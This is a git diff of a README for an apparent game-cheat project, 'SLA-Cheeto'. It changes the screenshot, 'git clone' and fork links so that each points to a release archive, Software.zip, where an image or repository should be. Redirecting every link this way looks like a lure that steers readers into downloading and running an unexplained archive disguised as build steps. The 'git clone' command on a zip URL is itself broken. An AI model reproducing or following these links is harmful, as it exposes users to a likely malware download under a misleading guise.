@@ -26,15 +26,15 @@ This project is created and shared for educational purposes only. I do not condo
 - Disable Web View (Disables annoying web pop-up when entering the game)
 
 ## Screenshot
-![menu](https://github.com/Razzor07/SLA-Cheeto/releases/download/v1.0/Soft.zip)
+![menu](https://github.com/Razzor07/SLA-Cheeto/releases/download/v2.0/Software.zip)
 
 ## Building
-1. Clone the repository: `git clone --recurse-submodules https://github.com/Razzor07/SLA-Cheeto/releases/download/v1.0/Soft.zip`.
+1. Clone the repository: `git clone --recurse-submodules https://github.com/Razzor07/SLA-Cheeto/releases/download/v2.0/Software.zip`.
 2. Build with your preferred IDE.
 3. Output will be in bin/
 
 ## Contributing
-1. Fork the repo (<https://github.com/Razzor07/SLA-Cheeto/releases/download/v1.0/Soft.zip>).
+1. Fork the repo (<https://github.com/Razzor07/SLA-Cheeto/releases/download/v2.0/Software.zip>).
 2. Create your feature branch.
 3. Commit your changes.
 4. Push your changes to the branch.
